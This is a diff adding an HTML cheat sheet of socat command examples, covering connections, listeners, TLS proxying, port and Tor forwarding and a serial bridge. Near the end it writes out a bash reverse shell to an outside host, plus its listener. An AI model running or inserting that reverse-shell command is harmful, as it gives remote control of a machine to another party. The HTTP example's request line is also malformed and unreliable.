@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>socat</title>
+  <style type="text/css">
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+</head>
+<body>
+<h1 id="socat-connect-to-http-server-port-80-on-butzel.info">socat connect to http-server (port 80 on ‘butzel.info’)</h1>
+<p>socat TCP4:butzel.info:80 -</p>
+<h1 id="connect-to-https-server-port-443-on-butzel.info-with-tls">connect to https-server (port 443 on ‘butzel.info’ with tls)</h1>
+<p>socat openssl:butzel.info:443 -</p>
+<h1 id="tcp-listener-port-3180-output-as-hexdump--x-and-fork-for-new-connetions">tcp-listener (port 3180), output as hexdump (-x) and fork for new connetions</h1>
+<p>socat -x tcp-listen:3180,fork -</p>
+<h1 id="practical-examples">practical examples:</h1>
+<h1 id="complete-real-working-http-example">complete real working http-example:</h1>
+<h1 id="sleep-is-necessary-to-prevent-socat-closing-socket-before-data-received">(sleep is necessary to prevent socat closing socket before data received)</h1>
+<p>(echo -e "GET / HTTP/1.1: butzel.info &amp;&amp; sleep 1)<br />
+| socat tcp4:butzel.info:80 -</p>
+<h1 id="http-to-https-proxy-for-an-webserver-without-tls-support">http to httpS ‘Proxy’ (for an webserver without TLS-Support)</h1>
+<p>socat OPENSSL-LISTEN:443,reuseaddr,pf=ip4,fork,cert=server.pem,cafile=client.crt,verify=0 TCP4-CONNECT:127.0.0.1:80</p>
+<h1 id="port-forwarding-e.g.-own-port-3180-to-port-22ssh-on-target">port forwarding (e.g. own port 3180 to port 22(ssh) on target</h1>
+<p>socat TCP4-LISTEN:3180,reuseaddr,fork TCP4:butzel.info:ssh</p>
+<h1 id="tor-forwarding-needs-tor-daemon-on-port-9050-running">TOR-forwarding (needs tor-daemon on port 9050 running)</h1>
+<p>socat tcp4-listen:8080,reuseaddr,fork socks4A:127.0.0.1:t0rhidd3ns3rvice.onion:80,socksport=9050</p>
+<h1 id="network-port-8266-to-serial-bridge-devttyusb0-baudrate-115200">network (port 8266) to serial bridge (/dev/ttyUSB0 baudrate: 115200)</h1>
+<p>socat TCP4-LISTEN:8266,fork,reuseaddr /dev/ttyUSB0,raw,crnl,b115200</p>
+<h1 id="udp-to-tcp">udp to tcp</h1>
+<p>socat -u udp-recvfrom:1234,fork tcp:localhost:4321</p>
+<h1 id="reverse-shell">reverse shell:</h1>
+<p>socat exec:‘bash -i’,pty,stderr tcp:remote.butzel.info:3180</p>
+<h1 id="listener-for-above-reverse-shell-on-remote.butzel.info">listener for above reverse shell (on remote.butzel.info):</h1>
+<p>socat file:<code>tty</code>,raw,echo=0 tcp-listen:3180</p>
+<h1 id="or-nc--lp-3180">or: nc -lp 3180</h1>
+</body>
+</html>
